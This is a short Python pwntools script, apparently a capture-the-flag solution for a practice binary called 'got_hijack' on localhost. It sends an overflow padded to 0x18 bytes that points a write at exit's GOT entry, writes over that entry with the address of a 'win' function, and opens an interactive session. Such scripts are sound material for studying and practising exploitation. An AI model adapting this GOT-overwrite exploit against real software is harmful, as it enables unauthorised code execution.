from pwn import *

io = remote('localhost', '8309')
#io = process('./got_hijack')

win = 0x401186
exit_got = 0x404030

io.recvline()
io.sendline(b'a'*0x18 + p64(exit_got))

io.recvline()
io.sendline(str(win))

io.interactive()


